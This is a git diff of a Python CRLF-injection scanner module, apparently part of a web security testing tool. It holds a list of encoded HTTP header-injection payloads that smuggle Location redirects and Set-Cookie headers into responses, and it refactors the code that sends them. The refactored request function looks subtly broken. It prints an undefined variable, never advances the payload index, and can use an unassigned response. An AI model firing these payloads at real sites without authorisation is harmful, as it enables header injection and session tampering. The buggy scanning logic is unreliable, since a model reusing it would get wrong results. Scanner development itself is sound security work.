@@ -1,26 +1,25 @@
 from core.others import good,bad,info,requester,proxies,requests,multitest
 RedirectCodes = [i for i in range(300,311,1)]
-from urllib.parse import unquote
 payloads = [
-            "%0d%0aLocation:www.google.com%0d%0a",
-            "%0d%0aSet-Cookie:name=ch33ms;",
+            r"%0d%0aLocation:www.google.com%0d%0a",
+            r"%0d%0aSet-Cookie:name=ch33ms;",
             r"\r\n\tSet-Cookie:name=ch33ms;",
             r"\r\tSet-Cookie:name=ch33ms;",
-            "%E5%98%8A%E5%98%8DLocation:www.google.com",
+            r"%E5%98%8A%E5%98%8DLocation:www.google.com",
             r"\rSet-Cookie:name=ch33ms;",
             r"\r%20Set-Cookie:name=ch33ms;",
             r"\r\nSet-Cookie:name=ch33ms;",
             r"\r\n%20Set-Cookie:name=ch33ms;",
             r"\rSet-Cookie:name=ch33ms;",
-            "%u000ASet-Cookie:name=ch33ms;",
+            r"%u000ASet-Cookie:name=ch33ms;",
             r"\r%20Set-Cookie:name=ch33ms;",
-            "%23%0D%0ALocation:www.google.com;",
+            r"%23%0D%0ALocation:www.google.com;",
             r"\r\nSet-Cookie:name=ch33ms;",
             r"\r\n%20Set-Cookie:name=ch33ms;",
             r"\r\n\tSet-Cookie:name=ch33ms;",
             r"\r\tSet-Cookie:name=ch33ms;",
-            "%5cr%5cnLocation:www.google.com",
-            "%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:name=ch33ms;",
+            r"%5cr%5cnLocation:www.google.com",
+            r"%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:name=ch33ms;",
             r"\r\n Header-Test:BLATRUC",
             r"\rSet-Cookie:name=ch33ms;",
             r"\r%20Set-Cookie:name=ch33ms;",
@@ -33,56 +32,43 @@ payloads = [
 def CrlfScan(url,Foxy):
     result = multitest(url,payloads)
     if type(result) is tuple:
-        MultipleParams(result[0],result[1],Foxy)
+        for params in result[0]:
+            TestingBreak = request(result[1],Foxy,params)
+            if TestingBreak:
+                break
     else:
-        NoParams(result,Foxy)
-
-def MultipleParams(ParamList,Uri,Foxy):
-    PayloadIndex = 0
-
-    print("%s Checking for CRLF Injection" % info)
-    for params in ParamList:
-        try: 
-            page = requester(Uri,Foxy,params)
-            func_break = BasicChecks(page,payloads[PayloadIndex],unquote(page.request.url))
-            if func_break:
+        for url in result:
+            TestingBreak = request(url,Foxy)
+            if TestingBreak:
                 break
+
+def request(Uri,Foxy,Params='',PayloadIndex=0):
+    skip = 1
+    if Foxy:
+        try:
+            page = requester(Uri,True,Params)
         except requests.exceptions.Timeout:
             print("[\033[91mTimeout\033[00m] %s" % url)
-            break
+            return skip
         except requests.exceptions.ConnectionError:
             print("%s Connection Error" % bad)
-            break
-        except requests.exceptions.InvalidURL:
-            print("%s Invalid URL structure" % bad)
-            break
-        except KeyError:
-            PayloadIndex = 0
-
-def NoParams(Uris,Foxy):
-    PayloadIndex = 0
-
-    for url in Uris:
-        try: 
-            page = requester(url,Foxy)
-            func_break = BasicChecks(page,payloads[PayloadIndex],url)
-            if func_break:
-                break
+            return skip
+    else:
+        try:
+            page = requester(Uri,False,Params)
         except requests.exceptions.Timeout:
             print("[\033[91mTimeout\033[00m] %s" % url)
-            break
-
+            return skip
         except requests.exceptions.ConnectionError:
             print("%s Connection Error" % bad)
-            break
-
-        except requests.exceptions.InvalidURL:
-            print("%s Invalid URL structure" % bad)
-            break
-
-        except KeyError:
+            return skip
+        except IndexError:
             PayloadIndex = 0
 
+    function_break = BasicChecks(page,payloads[PayloadIndex],page.request.url)
+    PayloadIndex += 1
+    if function_break:
+        return skip  
 
 def BasicChecks(PageVar,payload,url):
     skip = 1
